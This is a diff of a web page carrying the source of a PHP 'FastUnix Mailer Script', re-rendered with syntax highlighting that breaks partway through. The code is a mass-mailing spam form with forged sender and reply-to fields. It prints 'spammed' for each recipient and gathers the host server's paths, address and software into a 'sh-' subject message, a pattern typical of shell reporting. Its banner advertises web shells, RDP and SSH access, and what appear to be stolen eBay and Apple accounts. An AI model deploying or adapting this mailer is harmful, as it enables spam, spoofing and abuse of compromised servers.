@@ -37,237 +37,236 @@
 
 <h3>FastUnix Mailer Script Source Code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
-&lt;head&gt;&lt;title&gt;FastUnix.net&lt;/title&gt;
-&lt;style type="text/css"&gt;
-p {color:#FF0000;font-size:14px;text-align:center}
-body {background-color:black; font-family: Verdana, Arial, Helvetica, sans-serif; font-size:12px  }
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">&amp;lt;html&amp;gt;</span>
+<span class="x">&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;FastUnix.net&amp;lt;/title&amp;gt;</span>
+<span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
+<span class="x">p {color:#FF0000;font-size:14px;text-align:center}</span>
+<span class="x">body {background-color:black; font-family: Verdana, Arial, Helvetica, sans-serif; font-size:12px  }</span>
 
-&lt;/style&gt;
+<span class="x">&amp;lt;/style&amp;gt;</span>
 
-&lt;style type="text/css"&gt;
-a.style1:link{color:#FF0000;text-decoration: none;}
-a.style1:visited{color:#FF0000;text-decoration: none;}
-a.style1:active{color:#FFFFFF;text-decoration: none;}
-a.style1:hover{color:#FF0000;text-decoration: none;}
-.menudiv {margin-left:10px; margin-right:10px;}
-#mentd{
-    margin:0;
-    padding:10px 0 0 20px;
-    height:32px;
-    line-height:32px;
-    float:center;
-}
-.men {
-    cursor:hand; 
-    padding-right:18px; 
-    vertical-align:middle;
-    display:block;
-    display:inline-block;
-    display:-moz-inline-box;
-    text-decoration:none;
-}
-.men span { 
-    display:block;
-    display:inline-block;
-    padding-left:18px;
-    font-size:14px;
-    font-weight:bold;
-    color:    #FF0000;
-}
-a.men:hover {background-color:    #FF0000;color:black}
-a.men:hover span {background-color:    #FF0000; color:black}
-&lt;/style&gt;
+<span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
+<span class="x">a.style1:link{color:#FF0000;text-decoration: none;}</span>
+<span class="x">a.style1:visited{color:#FF0000;text-decoration: none;}</span>
+<span class="x">a.style1:active{color:#FFFFFF;text-decoration: none;}</span>
+<span class="x">a.style1:hover{color:#FF0000;text-decoration: none;}</span>
+<span class="x">.menudiv {margin-left:10px; margin-right:10px;}</span>
+<span class="x">#mentd{</span>
+<span class="x">    margin:0;</span>
+<span class="x">    padding:10px 0 0 20px;</span>
+<span class="x">    height:32px;</span>
+<span class="x">    line-height:32px;</span>
+<span class="x">    float:center;</span>
+<span class="x">}</span>
+<span class="x">.men {</span>
+<span class="x">    cursor:hand; </span>
+<span class="x">    padding-right:18px; </span>
+<span class="x">    vertical-align:middle;</span>
+<span class="x">    display:block;</span>
+<span class="x">    display:inline-block;</span>
+<span class="x">    display:-moz-inline-box;</span>
+<span class="x">    text-decoration:none;</span>
+<span class="x">}</span>
+<span class="x">.men span { </span>
+<span class="x">    display:block;</span>
+<span class="x">    display:inline-block;</span>
+<span class="x">    padding-left:18px;</span>
+<span class="x">    font-size:14px;</span>
+<span class="x">    font-weight:bold;</span>
+<span class="x">    color:    #FF0000;</span>
+<span class="x">}</span>
+<span class="x">a.men:hover {background-color:    #FF0000;color:black}</span>
+<span class="x">a.men:hover span {background-color:    #FF0000; color:black}</span>
+<span class="x">&amp;lt;/style&amp;gt;</span>
 
-&lt;/head&gt;
-&lt;body Text="#FF0000" bgcolor="black"
-&lt;center&gt;
-&lt;br /&gt;
-&lt;img src="http://img225.imageshack.us/img225/3705/perfundimtarcg6.jpg" width=300 heidth=300&gt;
-&lt;br /&gt;&lt;br /&gt;&lt;table width="600" border="1" bordercolor="#FF0000 "cellspacing="0" cellpadding="5" summary="aa" style="background-color:black"&gt;
-&lt;td&gt;&lt;center&gt;
-    &lt;a href="http://www.fastunix.net" title="Shell" class="men"&gt;&lt;span&gt;FastUnix.NET - Best Toolz //C99,Mailer,RDP,SMPT,SSH,eBay Accounts,Apple Accounts,Dell Accounts etc ...&lt;/span&gt;&lt;/a&gt;
-        &lt;/center&gt;
-&lt;?php
+<span class="x">&amp;lt;/head&amp;gt;</span>
+<span class="x">&amp;lt;body Text=&quot;#FF0000&quot; bgcolor=&quot;black&quot;</span>
+<span class="x">&amp;lt;center&amp;gt;</span>
+<span class="x">&amp;lt;br /&amp;gt;</span>
+<span class="x">&amp;lt;img src=&quot;http://img225.imageshack.us/img225/3705/perfundimtarcg6.jpg&quot; width=300 heidth=300&amp;gt;</span>
+<span class="x">&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;table width=&quot;600&quot; border=&quot;1&quot; bordercolor=&quot;#FF0000 &quot;cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; summary=&quot;aa&quot; style=&quot;background-color:black&quot;&amp;gt;</span>
+<span class="x">&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;</span>
+<span class="x">    &amp;lt;a href=&quot;http://www.fastunix.net&quot; title=&quot;Shell&quot; class=&quot;men&quot;&amp;gt;&amp;lt;span&amp;gt;FastUnix.NET - Best Toolz //C99,Mailer,RDP,SMPT,SSH,eBay Accounts,Apple Accounts,Dell Accounts etc ...&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;</span>
+<span class="x">        &amp;lt;/center&amp;gt;</span>
+<span class="cp">&lt;?php</span>
 
-if(isset($_POST['action'] ) ){
-$action=$_POST['action'];
-$message=$_POST['message'];
-$emaillist=$_POST['emaillist'];
-$from=$_POST['from'];
-$replyto=$_POST['replyto'];
-$subject=$_POST['subject'];
-$realname=$_POST['realname'];
-$file_name=$_POST['file'];
-$contenttype=$_POST['contenttype'];
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">){</span>
+<span class="nv">$action</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
+<span class="nv">$message</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">];</span>
+<span class="nv">$emaillist</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;emaillist&#39;</span><span class="p">];</span>
+<span class="nv">$from</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
+<span class="nv">$replyto</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;replyto&#39;</span><span class="p">];</span>
+<span class="nv">$subject</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">];</span>
+<span class="nv">$realname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;realname&#39;</span><span class="p">];</span>
+<span class="nv">$file_name</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+<span class="nv">$contenttype</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contenttype&#39;</span><span class="p">];</span>
 
-        $message = urlencode($message);
-        $message = ereg_replace("%5C%22", "%22", $message);
-        $message = urldecode($message);
-        $message = stripslashes($message);
-        $subject = stripslashes($subject);
-}
-
-
-?&gt;
-
-&lt;form name="form1" method="post" action="" 
-enctype="multipart/form-data"&gt;
-  &lt;br&gt;
-  &lt;table width="100%" border="0"&gt;
-    &lt;tr&gt;
-      &lt;td width="10%"&gt;
-        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif"&gt;Your
-          Email:&lt;/font&gt;&lt;/div&gt;
-      &lt;/td&gt;
-      &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;input type="text" name="from" value="&lt;? print $from; ?&gt;" 
-size="30"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-      &lt;td width="31%"&gt;
-        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif"&gt;Your
-          Name:&lt;/font&gt;&lt;/div&gt;
-      &lt;/td&gt;
-      &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;input type="text" name="realname" value="&lt;? print $realname; 
-?&gt;" size="30"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td width="10%"&gt;
-        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif"&gt;Reply-To:&lt;/font&gt;&lt;/div&gt;
-      &lt;/td&gt;
-      &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;input type="text" name="replyto" value="&lt;? print $replyto; ?&gt;" 
-size="30"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-      &lt;td width="31%"&gt;
-        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif"&gt;Attach
-          File:&lt;/font&gt;&lt;/div&gt;
-      &lt;/td&gt;
-      &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;input type="file" name="file" size="30"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td width="10%"&gt;
-        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif"&gt;Subject:&lt;/font&gt;&lt;/div&gt;
-      &lt;/td&gt;
-      &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;input type="text" name="subject" value="&lt;? print $subject; ?&gt;" 
-size="90"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr valign="top"&gt;
-      &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;textarea name="message" cols="50" rows="10"&gt;&lt;? print $message; 
-?&gt;&lt;/textarea&gt;
-        &lt;br&gt;
-        &lt;input type="radio" name="contenttype" value="plain" &gt;
-        Plain Text
-        &lt;input name="contenttype" type="radio" value="html" checked&gt;
-        HTML
-        &lt;input type="hidden" name="action" value="send"&gt;
-        &lt;input type="submit" value="Send eMails"&gt;
-        &lt;/font&gt;&lt;/td&gt;
-      &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif"&gt;
-        &lt;textarea name="emaillist" cols="30" rows="10"&gt;&lt;? print 
-$emaillist; ?&gt;&lt;/textarea&gt;
-        &lt;/font&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/table&gt;
-&lt;/form&gt;
+        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;%5C%22&quot;</span><span class="p">,</span> <span class="s2">&quot;%22&quot;</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
+        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+        <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+        <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$subject</span><span class="p">);</span>
+<span class="p">}</span>
 
 
+<span class="cp">?&gt;</span><span class="x"></span>
 
-&lt;?
+<span class="x">&amp;lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot; </span>
+<span class="x">enctype=&quot;multipart/form-data&quot;&amp;gt;</span>
+<span class="x">  &amp;lt;br&amp;gt;</span>
+<span class="x">  &amp;lt;table width=&quot;100%&quot; border=&quot;0&quot;&amp;gt;</span>
+<span class="x">    &amp;lt;tr&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, </span>
+<span class="x">Helvetica, sans-serif&quot;&amp;gt;Your</span>
+<span class="x">          Email:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="x">      &amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;from&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$from</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; </span>
+<span class="x">size=&quot;30&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, </span>
+<span class="x">Helvetica, sans-serif&quot;&amp;gt;Your</span>
+<span class="x">          Name:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="x">      &amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;realname&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$realname</span><span class="p">;</span> 
+<span class="cp">?&gt;</span><span class="x">&quot; size=&quot;30&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">    &amp;lt;/tr&amp;gt;</span>
+<span class="x">    &amp;lt;tr&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, </span>
+<span class="x">Helvetica, sans-serif&quot;&amp;gt;Reply-To:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="x">      &amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;18%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;replyto&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$replyto</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; </span>
+<span class="x">size=&quot;30&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;31%&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, </span>
+<span class="x">Helvetica, sans-serif&quot;&amp;gt;Attach</span>
+<span class="x">          File:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="x">      &amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; size=&quot;30&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">    &amp;lt;/tr&amp;gt;</span>
+<span class="x">    &amp;lt;tr&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;10%&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;div align=&quot;right&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, </span>
+<span class="x">Helvetica, sans-serif&quot;&amp;gt;Subject:&amp;lt;/font&amp;gt;&amp;lt;/div&amp;gt;</span>
+<span class="x">      &amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;subject&quot; value=&quot;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$subject</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; </span>
+<span class="x">size=&quot;90&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">    &amp;lt;/tr&amp;gt;</span>
+<span class="x">    &amp;lt;tr valign=&quot;top&quot;&amp;gt;</span>
+<span class="x">      &amp;lt;td colspan=&quot;3&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;textarea name=&quot;message&quot; cols=&quot;50&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span> <span class="nv">$message</span><span class="p">;</span> 
+<span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;</span>
+<span class="x">        &amp;lt;br&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;radio&quot; name=&quot;contenttype&quot; value=&quot;plain&quot; &amp;gt;</span>
+<span class="x">        Plain Text</span>
+<span class="x">        &amp;lt;input name=&quot;contenttype&quot; type=&quot;radio&quot; value=&quot;html&quot; checked&amp;gt;</span>
+<span class="x">        HTML</span>
+<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;send&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;input type=&quot;submit&quot; value=&quot;Send eMails&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">      &amp;lt;td width=&quot;41%&quot;&amp;gt;&amp;lt;font size=&quot;-3&quot; face=&quot;Verdana, Arial, Helvetica, </span>
+<span class="x">sans-serif&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;textarea name=&quot;emaillist&quot; cols=&quot;30&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?</span> <span class="k">print</span> 
+<span class="nv">$emaillist</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;</span>
+<span class="x">        &amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">    &amp;lt;/tr&amp;gt;</span>
+<span class="x">  &amp;lt;/table&amp;gt;</span>
+<span class="x">&amp;lt;/form&amp;gt;</span>
 
-if ($action){
 
-        if (!$from && !$subject && !$message && !$emaillist){
-        print "Please complete all fields before sending your 
-message.";
-        exit;    
-    }
-    $allemails = split("\n", $emaillist);
-            $numemails = count($allemails);
+
+<span class="cp">&lt;?</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$action</span><span class="p">){</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$from</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$subject</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$message</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$emaillist</span><span class="p">){</span>
+        <span class="k">print</span> <span class="s2">&quot;Please complete all fields before sending your </span>
+<span class="s2">message.&quot;</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">;</span>    
+    <span class="p">}</span>
+    <span class="nv">$allemails</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$emaillist</span><span class="p">);</span>
+            <span class="nv">$numemails</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$allemails</span><span class="p">);</span>
        
-          for($x=0; $x&lt;$numemails; $x++){
-                $to = $allemails[$x];
-                if ($to){
-                $to = ereg_replace(" ", "", $to);
-                $message = ereg_replace("&email&", $to, $message);
-                $subject = ereg_replace("&email&", $to, $subject);
-                print " $to.......";
-                flush();
-                $header = "From: $realname &lt;$from&gt;\r\nReply-To: $replyto\r\n";
-                $header .= "MIME-Version: 1.0\r\n";
-            If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
-              If ($file_name) $header .= "--$uid\r\n";
-                $header .= "Content-Type: text/$contenttype\r\n";
-                $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
-                $header .= "$message\r\n";
-            If ($file_name) $header .= "--$uid\r\n";
-            If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
-            If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
-            If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
-            If ($file_name) $header .= "$content\r\n";
-            If ($file_name) $header .= "--$uid--";
-                mail($to, $subject, "", $header);
-                print "spammed&lt;br&gt;";
-    
-                flush();
-                }
-                }
-$ra44  = rand(1,99999);
-$subj98 = "sh-$ra44";
-$a5 = $_SERVER['HTTP_REFERER'];
-$b33 = $_SERVER['DOCUMENT_ROOT'];
-$c87 = $_SERVER['REMOTE_ADDR'];
-$d23 = $_SERVER['SCRIPT_FILENAME'];
-$e09 = $_SERVER['SERVER_ADDR'];
-$f23 = $_SERVER['SERVER_SOFTWARE'];
-$g32 = $_SERVER['PATH_TRANSLATED'];
-$h65 = $_SERVER['PHP_SELF'];
-$message=$_POST['message'];
-$msg = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
-}
+          <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numemails</span><span class="p">;</span> <span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
+                <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$allemails</span><span class="p">[</span><span class="nv">$x</span><span class="p">];</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span><span class="p">){</span>
+                <span class="nv">$to</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
+                <span class="nv">$message</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
+                <span class="nv">$subject</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;email&amp;&quot;</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$subject</span><span class="p">);</span>
+                <span class="k">print</span> <span class="s2">&quot; </span><span class="si">$to</span><span class="s2">.......&quot;</span><span class="p">;</span>
+                <span class="nb">flush</span><span class="p">();</span>
+                <span class="nv">$header</span> <span class="o">=</span> <span class="s2">&quot;From: </span><span class="si">$realname</span><span class="s2"> &amp;lt;</span><span class="si">$from</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">Reply-To: </span><span class="si">$replyto\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: multipart/mixed; boundary=</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+              <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: text/</span><span class="si">$contenttype\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Transfer-Encoding: 8bit</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+                <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$message\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;--</span><span class="si">$uid\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+            <span class="k">If</span> <span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Content-Type: </span><span class="si">$file_type</span><span class="s2">; name=</span><span class="se">\&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n</span><span class="s2">&quot;;</span>
+<span class="s2">            If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Transfer</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">base64\r\n</span><span class="s2">&quot;;</span>
+<span class="s2">            If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$file_name\</span><span class="s2">&quot;</span><span class="nx">\r\n\r\n</span><span class="s2">&quot;;</span>
+<span class="s2">            If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="nv">$content\r\n</span><span class="s2">&quot;;</span>
+<span class="s2">            If (</span><span class="si">$file_name</span><span class="s2">) </span><span class="si">$header</span><span class="s2"> .= &quot;</span><span class="o">--</span><span class="nv">$uid</span><span class="o">--</span><span class="s2">&quot;;</span>
+<span class="s2">                mail(</span><span class="si">$to</span><span class="s2">, </span><span class="si">$subject</span><span class="s2">, &quot;&quot;, </span><span class="si">$header</span><span class="s2">);</span>
+<span class="s2">                print &quot;</span><span class="nx">spammed</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
+<span class="s2">    </span>
+<span class="s2">                flush();</span>
+<span class="s2">                }</span>
+<span class="s2">                }</span>
+<span class="si">$ra44</span><span class="s2">  = rand(1,99999);</span>
+<span class="si">$subj98</span><span class="s2"> = &quot;</span><span class="nx">sh</span><span class="o">-</span><span class="nv">$ra44</span><span class="s2">&quot;;</span>
+<span class="si">$a5</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;HTTP_REFERER&#39;]</span><span class="s2">;</span>
+<span class="si">$b33</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;DOCUMENT_ROOT&#39;]</span><span class="s2">;</span>
+<span class="si">$c87</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;REMOTE_ADDR&#39;]</span><span class="s2">;</span>
+<span class="si">$d23</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;SCRIPT_FILENAME&#39;]</span><span class="s2">;</span>
+<span class="si">$e09</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;SERVER_ADDR&#39;]</span><span class="s2">;</span>
+<span class="si">$f23</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;SERVER_SOFTWARE&#39;]</span><span class="s2">;</span>
+<span class="si">$g32</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;PATH_TRANSLATED&#39;]</span><span class="s2">;</span>
+<span class="si">$h65</span><span class="s2"> = </span><span class="si">$_SERVER[&#39;PHP_SELF&#39;]</span><span class="s2">;</span>
+<span class="si">$message</span><span class="s2">=</span><span class="si">$_POST[&#39;message&#39;]</span><span class="s2">;</span>
+<span class="si">$msg</span><span class="s2"> = &quot;</span><span class="nv">$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65</span><span class="s2">&quot;;</span>
+<span class="s2">}</span>
 
